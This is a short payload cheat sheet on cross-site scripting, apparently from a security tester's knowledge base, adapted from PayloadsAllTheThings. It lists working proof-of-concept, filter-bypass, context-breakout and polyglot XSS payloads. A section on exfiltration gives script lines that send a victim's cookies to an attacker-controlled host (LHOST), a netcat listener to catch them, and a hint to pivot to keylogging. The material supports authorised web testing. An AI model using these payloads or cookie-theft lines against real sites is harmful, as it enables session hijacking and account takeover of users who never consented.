---
summary: XSS payloads — PoC, filter bypasses, context breakouts, cookie/exfil.
status: active
tags: [security, payloads, xss, web]
private: false
---

# XSS Payloads

Source: [PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection). First confirm reflection context (HTML body / attribute / JS / URL), then pick a breakout.

## Proof of concept

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## Filter bypasses

```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>   <!-- no quotes -->
<svg/onload=alert(1)>                                       <!-- no spaces -->
<details/open/ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<body onload=alert(1)>
<video src=_ onloadstart=alert(1)>
<img src=x:alert(alt) onerror=eval(src) alt=1>
```

## Context breakouts

```html
"><script>alert(1)</script>          <!-- break out of an attribute value -->
'-alert(1)-'                          <!-- inside a JS string -->
';alert(1);//                         <!-- close JS statement -->
</title><script>alert(1)</script>    <!-- break out of <title> etc -->
javascript:alert(1)                   <!-- href / src sink -->
```

## Cookie / data exfil (blind & stored XSS)

```html
<script>new Image().src='http://LHOST/c?='+document.cookie</script>
<script>fetch('http://LHOST/c?='+encodeURIComponent(document.cookie))</script>
<script>document.location='http://LHOST/g?c='+document.cookie</script>
```

Catch with `nc -lvnp 80` or a simple logging endpoint. `HttpOnly` cookies won't leak — pivot to CSRF/keylogging/session-riding instead.

## Polyglot (fires in many contexts)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

## Related

- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Web Application Testing](kb://11-security-playbook-web-app-testing)
